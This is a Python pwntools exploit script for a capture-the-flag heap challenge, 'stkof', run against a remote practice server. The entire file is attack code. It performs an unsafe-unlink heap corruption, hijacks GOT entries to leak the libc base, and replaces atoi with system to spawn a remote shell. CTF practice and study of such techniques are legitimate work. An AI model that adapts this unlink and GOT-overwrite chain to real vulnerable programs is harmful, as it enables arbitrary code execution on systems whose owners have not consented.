from pwn import *
import pwn

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('stkof')
io = remote('node4.buuoj.cn', 25116)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('stkof')
ptr_list = 0x602140
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

def add(size):
    io.sendline('1')
    io.sendline(str(size))


def edit(index, size, content):
    io.sendline('2')
    io.sendline(str(index))
    io.sendline(str(size))
    io.send(content)


def delete(index):
    io.sendline('3')
    io.sendline(str(index))


def unlink():
    add(0x28)                   # chunk1
    add(0x28)                   # chunk2
    add(0x88)                   # chunk3
    fd, bk = ptr_list - 8, ptr_list
    payload = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p8(0x90)
    edit(2, 0x29, payload)
    delete(3)


def pwn():
    payload = cyclic(8) + p64(free_got) + p64(atoi_got) * 2
    edit(2, 0x20, payload)
    edit(0, 8, p64(puts_plt))
    delete(1)
    libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(2, 8, p64(system))
    io.sendline(b'/bin/sh\x00')
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()